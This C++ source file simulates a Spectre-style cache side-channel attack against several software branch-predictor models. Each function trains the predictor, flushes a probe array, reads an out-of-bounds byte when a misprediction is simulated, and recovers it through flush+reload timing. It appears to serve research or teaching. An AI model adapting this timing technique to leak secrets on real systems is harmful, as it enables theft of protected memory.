#include "parameters.h"

uint8_t leakSecretChar(size_t OOB_index, NBitSmithPredictor* pred, uint64_t cache_hit_threshold, int attempts, int training_iterations) {
    // Static pc value for the branch predictors
    char pc[32];
    sprintf(pc, "%lx", (uintptr_t)(
        (uint8_t (*)(size_t, NBitSmithPredictor*, uint64_t, int, int)) &leakSecretChar
    ));

    // Speculative execution variables
    volatile uint8_t dummy = 0;

    // Reload timing variables
    uint64_t t1, t2;
    unsigned int aux = 0;

    // Analysis variables
    int results[256];
    int indices[256];
    for (int i = 0; i < 256; i++)   results[i] = 0;
    int i, j, random_i;
    int first, second;

    for (int t = 0; t < attempts; t++) {

        // Randomize side channel access indices
        for (i = 0; i < 256; i++) indices[i] = i;
        for (i = 255; i > 0; i--) {
            j = rand() % (i + 1);
            swap(indices[i], indices[j]);
        }

        // (TRAIN) Train the predictor
        for (i = 0; i < training_iterations; i++) {
            pred->predict(pc, "t");
        }

        // (FLUSH) Flush the side channel from cache
        _mm_mfence(); // wait for current memory operations to complete
        for (i = 0; i < 256; i++) {
            _mm_clflush( &side_channel_array[i * CACHE_LINE_PADDING] );
        }
        _mm_mfence(); // wait for flush to complete

        // (SPECULATIVE EXEC) Simulate speculative execution access
        pred->predict(pc, "n");
        if (pred->getLastPrediction() == "t") {
            // The predictor simulated a mispredicted "taken"; so, we force the speculative execution that follows
            //      (ignoring realistic bounds checking due to simulator limitations)
            dummy &= side_channel_array[mem.read(OOB_index) * CACHE_LINE_PADDING];
        }

        // (RELOAD) Time cache accesses to the side channel
        for (i = 0; i < 256; i++) {
            random_i = indices[i];

            #ifndef ALLOW_RDTSCP
                t1 = __rdtscp(&aux); // Get timer start
                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
            #else
                _mm_mfence();
                t1 = __rdtsc(); // Get timer start
                _mm_mfence();
                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
                _mm_mfence();
                t2 = __rdtsc() - t1; // Get timer elapsed
                _mm_mfence();
            #endif

            if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                results[random_i]++;
            }

            #ifdef DEBUG_HIT_THRESHOLD
                printf("[HIT TIME: %d; HIT? %c]\n", t2, (t2 < cache_hit_threshold) ? 'y' : 'n');
            #endif
        }

        // Grab the top two counts to compare for early exit condition
        first = second = -1;
        for (i = 0; i < 256; i++) {
            if ((first < 0) || (results[i] >= results[first])) {
                second = first;
                first = i;
            } else if (second < 0 || results[i] >= results[second]) {
                second = i;
            }
        }

        // Early exit condition (referenced from: https://github.com/crozone/SpectrePoC ; made a huge difference in consistency)
        if (results[first] >= (2 * results[second] + 5) || (results[first] == 2 && results[second] == 0)) break;
    }

    #ifdef DEBUG
        sort(results, results + 256);
        printf("-----------------------------------\n");
        for (i = 0; i < 256; i++) {
            printf("%c\t:\t%d\n", i, results[i]);
        }
        printf("-----------------------------------\n");
    #endif

    // Return the most-likely leaked secret byte
    return first;
}

uint8_t leakSecretChar(size_t OOB_index, BimodalPredictor* pred, uint64_t cache_hit_threshold, int attempts, int training_iterations) {
    // Static pc value for the branch predictors
    char pc[32];
    sprintf(pc, "%lx", (uintptr_t)(
        (uint8_t (*)(size_t, BimodalPredictor*, uint64_t, int, int)) &leakSecretChar
    ));

    // Speculative execution variables
    volatile uint8_t dummy = 0;

    // Reload timing variables
    uint64_t t1, t2;
    unsigned int aux = 0;

    // Analysis variables
    int results[256];
    int indices[256];
    for (int i = 0; i < 256; i++)   results[i] = 0;
    int i, j, random_i;
    int first, second;

    for (int t = 0; t < attempts; t++) {

        // Randomize side channel access indices
        for (i = 0; i < 256; i++) indices[i] = i;
        for (i = 255; i > 0; i--) {
            j = rand() % (i + 1);
            swap(indices[i], indices[j]);
        }

        // (TRAIN) Train the predictor
        for (i = 0; i < training_iterations; i++) {
            pred->predict(pc, "t");
        }

        // (FLUSH) Flush the side channel from cache
        _mm_mfence(); // wait for current memory operations to complete
        for (i = 0; i < 256; i++) {
            _mm_clflush( &side_channel_array[i * CACHE_LINE_PADDING] );
        }
        _mm_mfence(); // wait for flush to complete

        // (SPECULATIVE EXEC) Simulate speculative execution access
        pred->predict(pc, "n");
        if (pred->getLastPrediction() == "t") {
            // The predictor simulated a mispredicted "taken"; so, we force the speculative execution that follows
            //      (ignoring realistic bounds checking due to simulator limitations)
            dummy &= side_channel_array[mem.read(OOB_index) * CACHE_LINE_PADDING];
        }

        // (RELOAD) Time cache accesses to the side channel
        for (i = 0; i < 256; i++) {
            random_i = indices[i];

            #ifndef ALLOW_RDTSCP
                t1 = __rdtscp(&aux); // Get timer start
                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
            #else
                _mm_mfence();
                t1 = __rdtsc(); // Get timer start
                _mm_mfence();
                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
                _mm_mfence();
                t2 = __rdtsc() - t1; // Get timer elapsed
                _mm_mfence();
            #endif

            if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                results[random_i]++;
            }

            #ifdef DEBUG_HIT_THRESHOLD
                printf("[HIT TIME: %d; HIT? %c]\n", t2, (t2 < cache_hit_threshold) ? 'y' : 'n');
            #endif
        }

        // Grab the top two counts to compare for early exit condition
        first = second = -1;
        for (i = 0; i < 256; i++) {
            if ((first < 0) || (results[i] >= results[first])) {
                second = first;
                first = i;
            } else if (second < 0 || results[i] >= results[second]) {
                second = i;
            }
        }

        // Early exit condition (referenced from: https://github.com/crozone/SpectrePoC ; made a huge difference in consistency)
        if (results[first] >= (2 * results[second] + 5) || (results[first] == 2 && results[second] == 0)) break;
    }

    #ifdef DEBUG
        sort(results, results + 256);
        printf("-----------------------------------\n");
        for (i = 0; i < 256; i++) {
            printf("%c\t:\t%d\n", i, results[i]);
        }
        printf("-----------------------------------\n");
    #endif

    // Return the most-likely leaked secret byte
    return first;
}

uint8_t leakSecretChar(size_t OOB_index, GSharePredictor* pred, uint64_t cache_hit_threshold, int attempts, int training_iterations) {
    // Static pc value for the branch predictors
    char pc[32];
    sprintf(pc, "%lx", (uintptr_t)(
        (uint8_t (*)(size_t, GSharePredictor*, uint64_t, int, int)) &leakSecretChar
    ));

    // Speculative execution variables
    volatile uint8_t dummy = 0;

    // Reload timing variables
    uint64_t t1, t2;
    unsigned int aux = 0;

    // Analysis variables
    int results[256];
    int indices[256];
    for (int i = 0; i < 256; i++)   results[i] = 0;
    int i, j, random_i;
    int first, second;

    for (int t = 0; t < attempts; t++) {

        // Randomize side channel access indices
        for (i = 0; i < 256; i++) indices[i] = i;
        for (i = 255; i > 0; i--) {
            j = rand() % (i + 1);
            swap(indices[i], indices[j]);
        }

        // (TRAIN) Train the predictor
        for (i = 0; i < training_iterations; i++) {
            pred->predict(pc, "t");
        }

        // (FLUSH) Flush the side channel from cache
        _mm_mfence(); // wait for current memory operations to complete
        for (i = 0; i < 256; i++) {
            _mm_clflush( &side_channel_array[i * CACHE_LINE_PADDING] );
        }
        _mm_mfence(); // wait for flush to complete

        // (SPECULATIVE EXEC) Simulate speculative execution access
        pred->predict(pc, "n");
        if (pred->getLastPrediction() == "t") {
            // The predictor simulated a mispredicted "taken"; so, we force the speculative execution that follows
            //      (ignoring realistic bounds checking due to simulator limitations)
            dummy &= side_channel_array[mem.read(OOB_index) * CACHE_LINE_PADDING];
        }

        // (RELOAD) Time cache accesses to the side channel
        for (i = 0; i < 256; i++) {
            random_i = indices[i];

            #ifndef ALLOW_RDTSCP
                t1 = __rdtscp(&aux); // Get timer start
                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
            #else
                _mm_mfence();
                t1 = __rdtsc(); // Get timer start
                _mm_mfence();
                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
                _mm_mfence();
                t2 = __rdtsc() - t1; // Get timer elapsed
                _mm_mfence();
            #endif

            if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                results[random_i]++;
            }

            #ifdef DEBUG_HIT_THRESHOLD
                printf("[HIT TIME: %d; HIT? %c]\n", t2, (t2 < cache_hit_threshold) ? 'y' : 'n');
            #endif
        }

        // Grab the top two counts to compare for early exit condition
        first = second = -1;
        for (i = 0; i < 256; i++) {
            if ((first < 0) || (results[i] >= results[first])) {
                second = first;
                first = i;
            } else if (second < 0 || results[i] >= results[second]) {
                second = i;
            }
        }

        // Early exit condition (referenced from: https://github.com/crozone/SpectrePoC ; made a huge difference in consistency)
        if (results[first] >= (2 * results[second] + 5) || (results[first] == 2 && results[second] == 0)) break;
    }

    #ifdef DEBUG
        sort(results, results + 256);
        printf("-----------------------------------\n");
        for (i = 0; i < 256; i++) {
            printf("%c\t:\t%d\n", i, results[i]);
        }
        printf("-----------------------------------\n");
    #endif

    // Return the most-likely leaked secret byte
    return first;
}

uint8_t leakSecretChar(size_t OOB_index, HybridPredictor* pred, uint64_t cache_hit_threshold, int attempts, int training_iterations) {
    // Static pc value for the branch predictors
    char pc[32];
    sprintf(pc, "%lx", (uintptr_t)(
        (uint8_t (*)(size_t, HybridPredictor*, uint64_t, int, int)) &leakSecretChar
    ));

    // Speculative execution variables
    volatile uint8_t dummy = 0;

    // Reload timing variables
    uint64_t t1, t2;
    unsigned int aux = 0;

    // Analysis variables
    int results[256];
    int indices[256];
    for (int i = 0; i < 256; i++)   results[i] = 0;
    int i, j, random_i;
    int first, second;

    for (int t = 0; t < attempts; t++) {

        // Randomize side channel access indices
        for (i = 0; i < 256; i++) indices[i] = i;
        for (i = 255; i > 0; i--) {
            j = rand() % (i + 1);
            swap(indices[i], indices[j]);
        }

        // (TRAIN) Train the predictor
        for (i = 0; i < training_iterations; i++) {
            pred->predict(pc, "t");
        }

        // (FLUSH) Flush the side channel from cache
        _mm_mfence(); // wait for current memory operations to complete
        for (i = 0; i < 256; i++) {
            _mm_clflush( &side_channel_array[i * CACHE_LINE_PADDING] );
        }
        _mm_mfence(); // wait for flush to complete

        // (SPECULATIVE EXEC) Simulate speculative execution access
        pred->predict(pc, "n");
        if (pred->getLastPrediction() == "t") {
            // The predictor simulated a mispredicted "taken"; so, we force the speculative execution that follows
            //      (ignoring realistic bounds checking due to simulator limitations)
            dummy &= side_channel_array[mem.read(OOB_index) * CACHE_LINE_PADDING];
        }

        // (RELOAD) Time cache accesses to the side channel
        for (i = 0; i < 256; i++) {
            random_i = indices[i];

            #ifndef ALLOW_RDTSCP
                t1 = __rdtscp(&aux); // Get timer start
                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
            #else
                _mm_mfence();
                t1 = __rdtsc(); // Get timer start
                _mm_mfence();
                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
                _mm_mfence();
                t2 = __rdtsc() - t1; // Get timer elapsed
                _mm_mfence();
            #endif

            if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                results[random_i]++;
            }

            #ifdef DEBUG_HIT_THRESHOLD
                printf("[HIT TIME: %d; HIT? %c]\n", t2, (t2 < cache_hit_threshold) ? 'y' : 'n');
            #endif
        }

        // Grab the top two counts to compare for early exit condition
        first = second = -1;
        for (i = 0; i < 256; i++) {
            if ((first < 0) || (results[i] >= results[first])) {
                second = first;
                first = i;
            } else if (second < 0 || results[i] >= results[second]) {
                second = i;
            }
        }

        // Early exit condition (referenced from: https://github.com/crozone/SpectrePoC ; made a huge difference in consistency)
        if (results[first] >= (2 * results[second] + 5) || (results[first] == 2 && results[second] == 0)) break;
    }

    #ifdef DEBUG
        sort(results, results + 256);
        printf("-----------------------------------\n");
        for (i = 0; i < 256; i++) {
            printf("%c\t:\t%d\n", i, results[i]);
        }
        printf("-----------------------------------\n");
    #endif

    // Return the most-likely leaked secret byte
    return first;
}

uint8_t leakSecretChar(size_t OOB_index, BasePredictor* pred, uint64_t cache_hit_threshold, int attempts, int training_iterations) {
    // Static pc value for the branch predictors
    uint64_t pc = reinterpret_cast<uint64_t>((
        (uint8_t (*)(size_t, NBitSmithPredictor*, uint64_t, int, int)) &leakSecretChar
    ));

    bool res;

    // Speculative execution variables
    volatile uint8_t dummy = 0;

    // Reload timing variables
    uint64_t t1, t2;
    unsigned int aux = 0;

    // Analysis variables
    int results[256];
    int indices[256];
    for (int i = 0; i < 256; i++)   results[i] = 0;
    int i, j, random_i;
    int first, second;

    for (int t = 0; t < attempts; t++) {

        // Randomize side channel access indices
        for (i = 0; i < 256; i++) indices[i] = i;
        for (i = 255; i > 0; i--) {
            j = rand() % (i + 1);
            swap(indices[i], indices[j]);
        }

        // (TRAIN) Train the predictor
        for (i = 0; i < training_iterations; i++) {
            res=pred->GetPrediction(pc);
            pred->UpdatePredictor(pc, true /*actual*/, res, 0); 
        }

        // (FLUSH) Flush the side channel from cache
        _mm_mfence(); // wait for current memory operations to complete
        for (i = 0; i < 256; i++) {
            _mm_clflush( &side_channel_array[i * CACHE_LINE_PADDING] );
        }
        _mm_mfence(); // wait for flush to complete

        // (SPECULATIVE EXEC) Simulate speculative execution access
        res=pred->GetPrediction(pc);
        pred->UpdatePredictor(pc, false /*actual*/, res, 0); 
        if (res) {
            // The predictor simulated a mispredicted "taken"; so, we force the speculative execution that follows
            //      (ignoring realistic bounds checking due to simulator limitations)
            dummy &= side_channel_array[mem.read(OOB_index) * CACHE_LINE_PADDING];
        }

        // (RELOAD) Time cache accesses to the side channel
        for (i = 0; i < 256; i++) {
            random_i = indices[i];

            #ifndef ALLOW_RDTSCP
                t1 = __rdtscp(&aux); // Get timer start
                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
                t2 = __rdtscp(&aux) - t1; // Get timer elapsed
            #else
                _mm_mfence();
                t1 = __rdtsc(); // Get timer start
                _mm_mfence();
                dummy &= side_channel_array[random_i * CACHE_LINE_PADDING]; // I love the compiler :)
                _mm_mfence();
                t2 = __rdtsc() - t1; // Get timer elapsed
                _mm_mfence();
            #endif

            if ((t2 < cache_hit_threshold) && (t2 > 0)) {
                results[random_i]++;
            }

            #ifdef DEBUG_HIT_THRESHOLD
                printf("[HIT TIME: %d; HIT? %c]\n", t2, (t2 < cache_hit_threshold) ? 'y' : 'n');
            #endif
        }

        // Grab the top two counts to compare for early exit condition
        first = second = -1;
        for (i = 0; i < 256; i++) {
            if ((first < 0) || (results[i] >= results[first])) {
                second = first;
                first = i;
            } else if (second < 0 || results[i] >= results[second]) {
                second = i;
            }
        }

        // Early exit condition (referenced from: https://github.com/crozone/SpectrePoC ; made a huge difference in consistency)
        if (results[first] >= (2 * results[second] + 5) || (results[first] == 2 && results[second] == 0)) break;
    }

    #ifdef DEBUG
        sort(results, results + 256);
        printf("-----------------------------------\n");
        for (i = 0; i < 256; i++) {
            printf("%c\t:\t%d\n", i, results[i]);
        }
        printf("-----------------------------------\n");
    #endif

    // Return the most-likely leaked secret byte
    return first;
}
